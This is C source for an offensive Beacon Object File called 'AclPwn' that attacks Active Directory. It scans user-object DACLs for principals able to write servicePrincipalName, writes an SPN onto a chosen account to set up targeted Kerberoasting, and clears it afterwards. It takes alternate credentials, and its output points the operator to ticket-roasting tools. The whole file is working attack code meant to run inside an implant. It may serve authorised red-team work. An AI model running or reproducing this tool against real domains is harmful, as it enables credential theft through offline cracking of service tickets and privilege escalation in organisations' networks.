#include <windows.h>
#include <winldap.h>
#include <winber.h>
#include <sddl.h>
#include <dsgetdc.h>
#include "beacon.h"
#include "bofdefs.h"

/*
 * AclPwn BOF - Phase 1: targeted-kerberoast primitives (enumeration + SPN write).
 * No ticket requests, no roasting - use nanorobeus/kerberoast for that.
 *
 * Modes:
 *   0 list-spn-writers      For each enabled user with no SPN, list every
 *                           principal in its DACL that can write SPN, plus
 *                           the owner. Domain-wide ACL inventory - not gated
 *                           on the current identity.
 *   1 set-spn               Write servicePrincipalName (refuses non-empty unless force)
 *   2 clear-spn             Delete servicePrincipalName
 *
 * Alternate creds via --domain/--user/--pass (LDAP_AUTH_NEGOTIATE identity).
 */

/* Minimal ANSI SEC_WINNT_AUTH_IDENTITY_A for ldap_bind_s(LDAP_AUTH_NEGOTIATE). */
typedef struct {
    unsigned char* User;
    unsigned long  UserLength;
    unsigned char* Domain;
    unsigned long  DomainLength;
    unsigned char* Password;
    unsigned long  PasswordLength;
    unsigned long  Flags;
} APW_AUTH_IDENTITY_A;
#define APW_AUTH_IDENTITY_FLAG_ANSI 0x1

/* ---- modes ---- */
#define MODE_LIST_SPN_WRITERS  0
#define MODE_SET_SPN           1
#define MODE_CLEAR_SPN         2

/* ---- ACE right masks ---- */
#define ACE_GENERICALL      0x10000000
#define ACE_GENERICWRITE    0x40000000
#define ACE_WRITEDACL       0x00040000
#define ACE_WRITEOWNER      0x00080000
#define ACE_WRITEPROPERTY   0x00000020

/* our result bits (subset of masks that let us write SPN, directly or indirectly) */
#define R_GENERICALL      0x01
#define R_GENERICWRITE    0x02
#define R_WRITEDACL       0x04
#define R_WRITEOWNER      0x08
#define R_WRITEPROP_ALL   0x10
#define R_WRITEPROP_SPN   0x20
#define R_OWNER           0x40   /* we are the owner => implicit WriteDACL */

#define ANY_SPN_WRITE (R_GENERICALL|R_GENERICWRITE|R_WRITEDACL|R_WRITEOWNER|R_WRITEPROP_ALL|R_WRITEPROP_SPN|R_OWNER)

#ifndef LDAP_SERVER_SD_FLAGS_OID
#define LDAP_SERVER_SD_FLAGS_OID "1.2.840.113556.1.4.801"
#endif

/* servicePrincipalName schemaIDGUID: f3a64788-5306-11d1-a9c5-0000f80367c1
 * (little-endian on the wire: first 3 fields byte-swapped). */
static const unsigned char SPN_ATTR_GUID[16] = {
    0x88,0x47,0xa6,0xf3, 0x06,0x53, 0xd1,0x11,
    0xa9,0xc5, 0x00,0x00, 0xf8,0x03,0x67,0xc1
};

/* ---- buffered output ---- */
#define OUTBUFSIZE 32768
static char* g_out    = (char*)1;
static int   g_outLen = 1;

static void bflush(void)
{
    if (g_out != NULL && g_out != (char*)1 && g_outLen > 0)
        BeaconOutput(CALLBACK_OUTPUT, g_out, g_outLen);
    g_outLen = 0;
    if (g_out != NULL && g_out != (char*)1) g_out[0] = '\0';
}

static void bprintf(const char* fmt, ...)
{
    va_list ap;
    int n, space;

    if (g_out == NULL || g_out == (char*)1) return;

    space = OUTBUFSIZE - g_outLen;
    if (space <= 1) { bflush(); space = OUTBUFSIZE; }

    va_start(ap, fmt);
    n = MSVCRT$vsnprintf(g_out + g_outLen, (size_t)space, fmt, ap);
    va_end(ap);

    if (n < 0 || n >= space) {
        bflush();
        va_start(ap, fmt);
        n = MSVCRT$vsnprintf(g_out, OUTBUFSIZE, fmt, ap);
        va_end(ap);
        if (n < 0 || n >= OUTBUFSIZE) {
            g_outLen = OUTBUFSIZE - 1;
            g_out[g_outLen] = '\0';
            return;
        }
        g_outLen = n;
        return;
    }
    g_outLen += n;
}

/* ---- domain context ---- */
static char g_dc[256];
static char g_realm[256];
static char g_base[512];
static LDAP* g_ld = NULL;

static BOOL ResolveDomain(const char* domain)
{
    PDOMAIN_CONTROLLER_INFOA pdc = NULL;
    int i;

    g_dc[0]    = '\0';
    g_realm[0] = '\0';

    if (NETAPI32$DsGetDcNameA(NULL, domain, NULL, NULL, 0, &pdc) != ERROR_SUCCESS || !pdc)
        return FALSE;

    {
        const char* name = pdc->DomainControllerName;
        if (name && name[0] == '\\' && name[1] == '\\') name += 2;
        for (i = 0; name && name[i] && i < (int)sizeof(g_dc) - 1; i++) g_dc[i] = name[i];
        g_dc[i] = '\0';
    }
    {
        const char* dn = pdc->DomainName;
        for (i = 0; dn && dn[i] && i < (int)sizeof(g_realm) - 1; i++) {
            char c = dn[i];
            if (c >= 'a' && c <= 'z') c = c - 'a' + 'A';
            g_realm[i] = c;
        }
        g_realm[i] = '\0';
    }

    NETAPI32$NetApiBufferFree(pdc);
    return (g_dc[0] != '\0' && g_realm[0] != '\0');
}

static BOOL LdapConnect(const char* domain, const char* user, const char* pass)
{
    ULONG rc;
    int   v = LDAP_VERSION3;

    g_ld = WLDAP32$ldap_init(g_dc, 389);
    if (!g_ld) return FALSE;

    if (WLDAP32$ldap_set_option(g_ld, LDAP_OPT_PROTOCOL_VERSION, &v) != LDAP_SUCCESS)
        return FALSE;

    {
        PVOID on  = LDAP_OPT_ON;
        PVOID off = LDAP_OPT_OFF;
        WLDAP32$ldap_set_option(g_ld, LDAP_OPT_SIGN,      &on);
        WLDAP32$ldap_set_option(g_ld, LDAP_OPT_ENCRYPT,   &on);
        /* Don't chase referrals: cross-domain hops during a large sweep are
         * the most common crash trigger in this style of BOF. */
        WLDAP32$ldap_set_option(g_ld, LDAP_OPT_REFERRALS, &off);
    }

    if (user && user[0] && pass && pass[0]) {
        APW_AUTH_IDENTITY_A ident;
        const char* idDomain = (domain && domain[0]) ? domain : g_realm;

        ident.User           = (unsigned char*)user;
        ident.UserLength     = (unsigned long)MSVCRT$strlen(user);
        ident.Domain         = (unsigned char*)idDomain;
        ident.DomainLength   = (unsigned long)MSVCRT$strlen(idDomain);
        ident.Password       = (unsigned char*)pass;
        ident.PasswordLength = (unsigned long)MSVCRT$strlen(pass);
        ident.Flags          = APW_AUTH_IDENTITY_FLAG_ANSI;

        rc = WLDAP32$ldap_bind_s(g_ld, NULL, (PCHAR)&ident, LDAP_AUTH_NEGOTIATE);
    } else {
        rc = WLDAP32$ldap_bind_s(g_ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    }

    if (rc != LDAP_SUCCESS) {
        bprintf("[!] LDAP bind failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
        return FALSE;
    }
    return TRUE;
}

static void LdapDisconnect(void)
{
    if (g_ld) { WLDAP32$ldap_unbind_s(g_ld); g_ld = NULL; }
}

static BOOL GetBaseDn(void)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR* vals      = NULL;
    PCHAR  attrs[]   = { "defaultNamingContext", NULL };
    ULONG  rc;

    rc = WLDAP32$ldap_search_s(g_ld, "", LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &res);
    if (rc != LDAP_SUCCESS || !res) return FALSE;

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) {
        vals = WLDAP32$ldap_get_values(g_ld, e, "defaultNamingContext");
        if (vals && vals[0]) {
            int i = 0;
            for (; vals[0][i] && i < (int)sizeof(g_base) - 1; i++) g_base[i] = vals[0][i];
            g_base[i] = '\0';
        }
        if (vals) WLDAP32$ldap_value_free(vals);
    }
    WLDAP32$ldap_msgfree(res);
    return g_base[0] != '\0';
}


/* Extract owner SID from a self-relative SD. Returns pointer inside sd, sets *sLen. */
static const unsigned char* GetOwnerSid(const unsigned char* sd, int sdLen, int* sLen)
{
    DWORD off;
    *sLen = 0;
    if (sdLen < 20) return NULL;
    off = (DWORD)sd[4] | ((DWORD)sd[5] << 8) | ((DWORD)sd[6] << 16) | ((DWORD)sd[7] << 24);
    if (off == 0 || off + 8 > (DWORD)sdLen) return NULL;
    if (sd[off] != 1) return NULL;
    int sub = sd[off + 1];
    if (sub > 15) return NULL;
    int L = 8 + 4 * sub;
    if (off + (DWORD)L > (DWORD)sdLen) return NULL;
    *sLen = L;
    return sd + off;
}

/* Escape reserved LDAP-filter characters in a value. */
static void LdapEscape(const char* in, char* out, int outSz)
{
    int i = 0, o = 0;
    while (in[i] && o < outSz - 4) {
        char c = in[i];
        switch (c) {
            case '*': o += MSVCRT$sprintf(out + o, "\\2a"); break;
            case '(': o += MSVCRT$sprintf(out + o, "\\28"); break;
            case ')': o += MSVCRT$sprintf(out + o, "\\29"); break;
            case '\\': o += MSVCRT$sprintf(out + o, "\\5c"); break;
            case '\0': break;
            default: out[o++] = c; break;
        }
        i++;
    }
    out[o] = '\0';
}

/* Resolve `target` (DN or sAMAccountName) to a DN. Caller frees via ldap_memfree. */
static PCHAR ResolveTargetDn(const char* target)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR attrs[]    = { "distinguishedName", NULL };
    PCHAR dn = NULL;
    ULONG rc;
    char filter[1024];

    /* If it contains '=' and starts with 'CN=' / 'OU=' / 'DC=' assume it's a DN. */
    if (MSVCRT$strchr(target, '=')) {
        rc = WLDAP32$ldap_search_s(g_ld, target, LDAP_SCOPE_BASE, "(objectClass=*)",
                                   attrs, 0, &res);
        if (rc == LDAP_SUCCESS && res) {
            e = WLDAP32$ldap_first_entry(g_ld, res);
            if (e) dn = WLDAP32$ldap_get_dn(g_ld, e);
            WLDAP32$ldap_msgfree(res);
            if (dn) return dn;
        }
    }

    /* Otherwise treat as sAMAccountName. */
    {
        char esc[512];
        LdapEscape(target, esc, sizeof(esc));
        MSVCRT$sprintf(filter, "(&(sAMAccountName=%s)(objectClass=user))", esc);
    }
    rc = WLDAP32$ldap_search_s(g_ld, g_base, LDAP_SCOPE_SUBTREE, filter, attrs, 0, &res);
    if (rc != LDAP_SUCCESS || !res) return NULL;
    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) dn = WLDAP32$ldap_get_dn(g_ld, e);
    WLDAP32$ldap_msgfree(res);
    return dn;
}

/* Print the human-readable list of rights encoded in `bits`. */
static void PrintRightsBits(DWORD bits)
{
    if (!bits) { bprintf("(none)"); return; }
    int first = 1;
    #define P(bit, name) do { if (bits & (bit)) { bprintf("%s%s", first ? "" : "|", name); first = 0; } } while (0)
    P(R_GENERICALL,    "GenericAll");
    P(R_GENERICWRITE,  "GenericWrite");
    P(R_WRITEPROP_SPN, "WriteProperty(SPN)");
    P(R_WRITEPROP_ALL, "WriteProperty(*)");
    P(R_WRITEDACL,     "WriteDACL");
    P(R_WRITEOWNER,    "WriteOwner");
    P(R_OWNER,         "Owner");
    #undef P
}

static void FormatSid(const unsigned char* sid, int len, char* out, int outSz)
{
    int   rev  = sid[0];
    int   nSub = sid[1];
    ULONG auth = ((ULONG)sid[4] << 24) | ((ULONG)sid[5] << 16) | ((ULONG)sid[6] << 8) | (ULONG)sid[7];
    int   pos  = 0;
    int   i;

    pos = MSVCRT$sprintf(out, "S-%d-%lu", rev, auth);
    for (i = 0; i < nSub; i++) {
        if (8 + i * 4 + 4 > len || pos >= outSz - 16) break;
        ULONG sub = (ULONG)sid[8 + i*4]
                  | ((ULONG)sid[8 + i*4 + 1] << 8)
                  | ((ULONG)sid[8 + i*4 + 2] << 16)
                  | ((ULONG)sid[8 + i*4 + 3] << 24);
        pos += MSVCRT$sprintf(out + pos, "-%lu", sub);
    }
}

static void LookupSidName(const unsigned char* sid, int sidLen, char* out, int outSz)
{
    char  name[256], domain[256];
    DWORD nameLen = sizeof(name), domainLen = sizeof(domain);
    SID_NAME_USE use;

    if (ADVAPI32$LookupAccountSidA(NULL, (PSID)(void*)sid, name, &nameLen, domain, &domainLen, &use)) {
        if (domain[0]) MSVCRT$sprintf(out, "%s\\%s", domain, name);
        else           MSVCRT$sprintf(out, "%s", name);
    } else {
        FormatSid(sid, sidLen, out, outSz);
    }
}

/* Default principals present in every user-object ACL (SYSTEM, Domain Admins,
 * Account/Server/Print/Backup Operators, BUILTIN\Administrators, CREATOR OWNER,
 * SELF, Enterprise DCs, Everyone). Skipped from output unless --noise. */
static BOOL IsBoringSid(const unsigned char* sid, int sidLen)
{
    if (sidLen < 8) return TRUE;
    int nSub = sid[1];
    if (nSub < 1 || nSub > 15) return TRUE;

    ULONG auth = ((ULONG)sid[6] << 8) | (ULONG)sid[7];
    ULONG s0   = (nSub >= 1) ? ((ULONG)sid[8]  | ((ULONG)sid[9]  << 8) | ((ULONG)sid[10] << 16) | ((ULONG)sid[11] << 24)) : 0;

    /* S-1-1-0 Everyone */
    if (auth == 1 && nSub == 1 && s0 == 0) return TRUE;
    /* S-1-3-0 CREATOR OWNER, S-1-3-1 CREATOR GROUP */
    if (auth == 3 && nSub == 1 && (s0 == 0 || s0 == 1)) return TRUE;

    if (auth == 5) {
        /* S-1-5-<n> single-sub well-knowns */
        if (nSub == 1) {
            if (s0 == 9 || s0 == 10 || s0 == 11 || s0 == 18 || s0 == 19 || s0 == 20)
                return TRUE;
        }
        /* S-1-5-32-<x> BUILTIN */
        if (nSub == 2 && s0 == 32) {
            ULONG s1 = (ULONG)sid[12] | ((ULONG)sid[13] << 8) | ((ULONG)sid[14] << 16) | ((ULONG)sid[15] << 24);
            if (s1 == 544 || s1 == 548 || s1 == 549 || s1 == 550 || s1 == 551 || s1 == 552)
                return TRUE;
        }
        /* Domain-scoped last RID: 500 (Admin), 512 (DA), 516 (DCs), 518 (Schema), 519 (EA), 520 (GPO CO) */
        if (nSub >= 5 && s0 == 21) {
            int off = 8 + (nSub - 1) * 4;
            if (off + 4 <= sidLen) {
                ULONG rid = (ULONG)sid[off] | ((ULONG)sid[off+1] << 8) | ((ULONG)sid[off+2] << 16) | ((ULONG)sid[off+3] << 24);
                if (rid == 500 || rid == 512 || rid == 516 || rid == 518 || rid == 519 || rid == 520)
                    return TRUE;
            }
        }
    }
    return FALSE;
}

/* ---- op: list SPN writers - who can write SPN on which no-SPN user ---- */
typedef struct {
    unsigned char sid[68];
    int           sidLen;
    DWORD         rights;
} spn_writer_t;

static void OpListSpnWriters(BOOL noise)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR attrs[]    = { "sAMAccountName", "nTSecurityDescriptor", NULL };
    ULONG rc;
    int   total = 0, hits = 0;

    unsigned char sdflags[5] = { 0x30, 0x03, 0x02, 0x01, 0x07 };
    struct berval ctlval = { sizeof(sdflags), (char*)sdflags };
    LDAPControl  ctl     = { LDAP_SERVER_SD_FLAGS_OID, ctlval, TRUE };
    PLDAPControl sctrls[] = { &ctl, NULL };

    /* Enabled user accounts with empty servicePrincipalName. */
    const char* filter =
        "(&(sAMAccountType=805306368)"
        "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
        "(!(servicePrincipalName=*)))";

    bprintf("[?] Base DN : %s\n", g_base);
    bprintf("[?] Filter  : enabled users, servicePrincipalName absent\n");
    bprintf("[?] Noise   : %s\n", noise ? "showing default principals" : "default principals suppressed (--noise to include)");
    bprintf("\n");
    bprintf("--- ACE legend (any one is enough to reach an SPN write) ---\n");
    bprintf("  GenericAll          full control - write SPN directly.\n");
    bprintf("  GenericWrite        write any attribute except the ACL - SPN in one step.\n");
    bprintf("  WriteProperty(SPN)  write servicePrincipalName specifically - one step.\n");
    bprintf("  WriteProperty(*)    write any attribute (no attr restriction) - SPN in one step.\n");
    bprintf("  WriteDACL           modify the DACL. Grant self GenericAll, then write.\n");
    bprintf("  WriteOwner          become owner (implicit WriteDACL). Take ownership,\n");
    bprintf("                      grant self GenericAll, then write.\n");
    bprintf("  Owner               already the owner - implicit WriteDACL.\n");
    bprintf("-------------------------------------------------------------\n\n");

    rc = WLDAP32$ldap_search_ext_s(g_ld, g_base, LDAP_SCOPE_SUBTREE, filter,
                                   attrs, 0, sctrls, NULL, NULL, 0, &res);
    if (rc != LDAP_SUCCESS || !res) {
        bprintf("[!] LDAP search failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
        if (res) WLDAP32$ldap_msgfree(res);
        return;
    }

    for (e = WLDAP32$ldap_first_entry(g_ld, res); e; e = WLDAP32$ldap_next_entry(g_ld, e)) {
        total++;

        struct berval** sdv = WLDAP32$ldap_get_values_len(g_ld, e, "nTSecurityDescriptor");
        if (!sdv || !sdv[0] || sdv[0]->bv_len < 20) {
            if (sdv) WLDAP32$ldap_value_free_len(sdv);
            continue;
        }
        const unsigned char* sd = (const unsigned char*)sdv[0]->bv_val;
        int sdLen = (int)sdv[0]->bv_len;

        spn_writer_t writers[64];
        int nWriters = 0;

        /* Owner (implicit WriteDACL). */
        int  ownLen = 0;
        const unsigned char* own = GetOwnerSid(sd, sdLen, &ownLen);
        if (own && ownLen > 0 && ownLen <= 68) {
            if (noise || !IsBoringSid(own, ownLen)) {
                MSVCRT$memcpy(writers[0].sid, own, ownLen);
                writers[0].sidLen = ownLen;
                writers[0].rights = R_OWNER;
                nWriters = 1;
            }
        }

        /* Walk DACL. */
        DWORD daclOff = (DWORD)sd[16] | ((DWORD)sd[17] << 8) | ((DWORD)sd[18] << 16) | ((DWORD)sd[19] << 24);
        if (daclOff && daclOff + 8 <= (DWORD)sdLen) {
            WORD aceCount = (WORD)(sd[daclOff + 4] | (sd[daclOff + 5] << 8));
            const unsigned char* ace = sd + daclOff + 8;
            int a;

            for (a = 0; a < (int)aceCount; a++) {
                if ((int)(ace - sd) + 8 > sdLen) break;
                BYTE aceType = ace[0];
                WORD aceSize = (WORD)(ace[2] | (ace[3] << 8));
                if (aceSize < 8 || (int)(ace - sd) + aceSize > sdLen) break;
                DWORD mask = (DWORD)ace[4] | ((DWORD)ace[5] << 8) | ((DWORD)ace[6] << 16) | ((DWORD)ace[7] << 24);

                const unsigned char* sidPtr = NULL;
                const unsigned char* objGuid = NULL;
                if (aceType == 0) {
                    sidPtr = ace + 8;
                } else if (aceType == 5 && aceSize >= 12) {
                    DWORD objFlags = (DWORD)ace[8] | ((DWORD)ace[9] << 8) |
                                     ((DWORD)ace[10] << 16) | ((DWORD)ace[11] << 24);
                    int sidOff = 12;
                    if (objFlags & 0x1) { objGuid = ace + 12; sidOff += 16; }
                    if (objFlags & 0x2) sidOff += 16;
                    sidPtr = ace + sidOff;
                } else { ace += aceSize; continue; }

                if (!sidPtr) { ace += aceSize; continue; }
                int sidOff = (int)(sidPtr - ace);
                if (sidOff < 8 || sidOff + 8 > (int)aceSize) { ace += aceSize; continue; }
                int subCount = sidPtr[1];
                if (sidPtr[0] != 1 || subCount > 15) { ace += aceSize; continue; }
                int sidLen2 = 8 + 4 * subCount;
                if (sidOff + sidLen2 > (int)aceSize) { ace += aceSize; continue; }

                DWORD r = 0;
                if (mask & ACE_GENERICALL)    r |= R_GENERICALL;
                if (mask & ACE_GENERICWRITE)  r |= R_GENERICWRITE;
                if (mask & ACE_WRITEDACL)     r |= R_WRITEDACL;
                if (mask & ACE_WRITEOWNER)    r |= R_WRITEOWNER;
                if (mask & ACE_WRITEPROPERTY) {
                    if (!objGuid) r |= R_WRITEPROP_ALL;
                    else {
                        int j; BOOL m = TRUE;
                        for (j = 0; j < 16; j++)
                            if (objGuid[j] != SPN_ATTR_GUID[j]) { m = FALSE; break; }
                        if (m) r |= R_WRITEPROP_SPN;
                    }
                }
                if (r == 0) { ace += aceSize; continue; }
                if (!noise && IsBoringSid(sidPtr, sidLen2)) { ace += aceSize; continue; }
                if (sidLen2 > 68) { ace += aceSize; continue; }

                /* Merge into writers[] (OR rights if SID already present). */
                int k, found = -1;
                for (k = 0; k < nWriters; k++) {
                    if (writers[k].sidLen == sidLen2) {
                        int j; BOOL eq = TRUE;
                        for (j = 0; j < sidLen2; j++)
                            if (writers[k].sid[j] != sidPtr[j]) { eq = FALSE; break; }
                        if (eq) { found = k; break; }
                    }
                }
                if (found >= 0) {
                    writers[found].rights |= r;
                } else if (nWriters < 64) {
                    MSVCRT$memcpy(writers[nWriters].sid, sidPtr, sidLen2);
                    writers[nWriters].sidLen = sidLen2;
                    writers[nWriters].rights = r;
                    nWriters++;
                }
                ace += aceSize;
            }
        }

        if (nWriters > 0) {
            PCHAR* sams = WLDAP32$ldap_get_values(g_ld, e, "sAMAccountName");
            PCHAR  dn   = WLDAP32$ldap_get_dn(g_ld, e);

            bprintf("[+] %s\n", sams && sams[0] ? sams[0] : "(?)");
            bprintf("    DN : %s\n", dn ? dn : "(?)");
            int k;
            for (k = 0; k < nWriters; k++) {
                char nameBuf[512];
                LookupSidName(writers[k].sid, writers[k].sidLen, nameBuf, sizeof(nameBuf));
                bprintf("      %-40s : ", nameBuf);
                PrintRightsBits(writers[k].rights);
                bprintf("\n");
            }
            bprintf("\n");

            if (sams) WLDAP32$ldap_value_free(sams);
            if (dn)   WLDAP32$ldap_memfree(dn);
            hits++;
        }

        WLDAP32$ldap_value_free_len(sdv);
    }

    WLDAP32$ldap_msgfree(res);
    bprintf("[*] Scanned %d no-SPN user(s); %d with interesting ACL edges.\n", total, hits);
}


/* Read current SPN value count (0 = empty). Fast path without printing. */
static int CountSpnValues(const char* dn)
{
    LDAPMessage* res = NULL;
    LDAPMessage* e   = NULL;
    PCHAR attrs[]    = { "servicePrincipalName", NULL };
    int   n = 0;

    if (WLDAP32$ldap_search_s(g_ld, dn, LDAP_SCOPE_BASE, "(objectClass=*)", attrs, 0, &res) != LDAP_SUCCESS || !res)
        return -1;

    e = WLDAP32$ldap_first_entry(g_ld, res);
    if (e) {
        PCHAR* vals = WLDAP32$ldap_get_values(g_ld, e, "servicePrincipalName");
        if (vals) { while (vals[n]) n++; WLDAP32$ldap_value_free(vals); }
    }
    WLDAP32$ldap_msgfree(res);
    return n;
}

/* ---- op: set servicePrincipalName ---- */
static void OpSetSpn(const char* target, const char* spn, BOOL force)
{
    PCHAR dn = ResolveTargetDn(target);
    if (!dn) { bprintf("[!] Target not found: %s\n", target); return; }

    bprintf("[?] Target : %s\n", dn);
    bprintf("[?] SPN    : %s\n", spn);

    int existing = CountSpnValues(dn);
    if (existing < 0) {
        bprintf("[!] Failed to read current servicePrincipalName\n");
        WLDAP32$ldap_memfree(dn);
        return;
    }
    if (existing > 0 && !force) {
        bprintf("[-] Target already has %d SPN(s). Refusing to overwrite.\n", existing);
        bprintf("[-] Re-run with --force to REPLACE the attribute (destructive).\n");
        WLDAP32$ldap_memfree(dn);
        return;
    }

    char* vals[2] = { (char*)spn, NULL };
    LDAPMod mod;
    LDAPMod* mods[2];
    mod.mod_op   = LDAP_MOD_REPLACE;
    mod.mod_type = "servicePrincipalName";
    mod.mod_vals.modv_strvals = vals;
    mods[0] = &mod;
    mods[1] = NULL;

    ULONG rc = WLDAP32$ldap_modify_s(g_ld, dn, mods);
    if (rc == LDAP_SUCCESS) {
        bprintf("[+] servicePrincipalName set to '%s' on %s\n", spn, dn);
        bprintf("[*] Kerberoast now with: nanorobeus / kerberoast BOF against '%s'\n", spn);
        bprintf("[*] Remember to run 'aclpwn clear-spn --target <t>' afterwards.\n");
    } else {
        bprintf("[!] ldap_modify_s failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
    }

    WLDAP32$ldap_memfree(dn);
}

/* ---- op: clear servicePrincipalName ---- */
static void OpClearSpn(const char* target)
{
    PCHAR dn = ResolveTargetDn(target);
    if (!dn) { bprintf("[!] Target not found: %s\n", target); return; }

    bprintf("[?] Target : %s\n", dn);

    LDAPMod mod;
    LDAPMod* mods[2];
    mod.mod_op   = LDAP_MOD_REPLACE;
    mod.mod_type = "servicePrincipalName";
    mod.mod_vals.modv_strvals = NULL;   /* REPLACE with empty = delete all */
    mods[0] = &mod;
    mods[1] = NULL;

    ULONG rc = WLDAP32$ldap_modify_s(g_ld, dn, mods);
    if (rc == LDAP_SUCCESS) {
        bprintf("[+] Cleared servicePrincipalName on %s\n", dn);
    } else {
        bprintf("[!] ldap_modify_s failed (0x%lx): %s\n", rc, WLDAP32$ldap_err2string(rc));
    }

    WLDAP32$ldap_memfree(dn);
}

/* ---- entry ---- */
void go(char* args, int len)
{
    datap parser;
    int   mode;
    char* target = NULL;
    char* spn    = NULL;
    char* domain = NULL;
    char* user   = NULL;
    char* pass   = NULL;
    int   force  = 0;

    g_out    = (char*)MSVCRT$calloc(OUTBUFSIZE, 1);
    g_outLen = 0;
    if (g_out) g_out[0] = '\0';

    /* .bss is not zeroed by the BOF loader in every path. */
    g_dc[0]      = '\0';
    g_realm[0]   = '\0';
    g_base[0]    = '\0';
    g_ld         = NULL;

    BeaconDataParse(&parser, args, len);
    mode   = BeaconDataInt(&parser);
    target = BeaconDataExtract(&parser, NULL);
    spn    = BeaconDataExtract(&parser, NULL);
    domain = BeaconDataExtract(&parser, NULL);
    user   = BeaconDataExtract(&parser, NULL);
    pass   = BeaconDataExtract(&parser, NULL);
    force  = BeaconDataInt(&parser);

    /* Per-op required-arg checks. */
    if ((mode == MODE_SET_SPN || mode == MODE_CLEAR_SPN) &&
        (!target || target[0] == '\0')) {
        bprintf("[-] --target is required for this operation\n");
        goto done;
    }
    if (mode == MODE_SET_SPN && (!spn || spn[0] == '\0')) {
        bprintf("[-] --spn is required for set-spn\n");
        goto done;
    }

    if (!ResolveDomain((domain && domain[0]) ? domain : NULL)) {
        bprintf("[!] Could not resolve DC / realm\n");
        goto done;
    }

    if (!LdapConnect(domain, user, pass)) {
        bprintf("[!] Failed to connect to LDAP (%s:389)\n", g_dc);
        goto done;
    }

    if (!GetBaseDn()) {
        bprintf("[!] Failed to read defaultNamingContext\n");
        goto done;
    }

    switch (mode) {
        case MODE_LIST_SPN_WRITERS: OpListSpnWriters(force != 0);        break;
        case MODE_SET_SPN:          OpSetSpn(target, spn, force != 0);   break;
        case MODE_CLEAR_SPN:        OpClearSpn(target);                  break;
        default: bprintf("[-] Unknown mode %d\n", mode); break;
    }

    LdapDisconnect();

done:
    bflush();
    if (g_out && g_out != (char*)1) MSVCRT$free(g_out);
    g_out    = (char*)1;
    g_outLen = 1;
}
